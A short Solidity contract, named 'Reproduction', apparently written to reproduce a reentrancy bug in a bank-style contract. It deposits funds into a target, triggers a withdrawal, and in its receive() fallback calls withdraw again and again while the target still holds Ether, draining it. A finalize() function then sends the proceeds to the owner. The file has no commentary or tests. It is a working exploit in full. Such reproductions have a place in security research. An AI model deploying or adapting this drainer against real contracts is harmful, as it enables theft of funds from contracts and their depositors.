interface IBank {
    function deposit() external payable;
    function withdraw(uint amount) external;
}

contract Reproduction {
    IBank public target;
    address public owner;

    constructor(address _target) {
        owner = msg.sender;
        target = IBank(_target);
    }

    function setup() external payable {
        target.deposit{value: msg.value}();
    }

    function trigger(uint amount) external {
        require(msg.sender == owner);
        target.withdraw(amount);
    }

    receive() external payable {
        if (address(target).balance > 0) {
            target.withdraw(msg.value);
        }
    }

    function finalize() external {
        require(msg.sender == owner);
        payable(owner).transfer(address(this).balance);
    }
}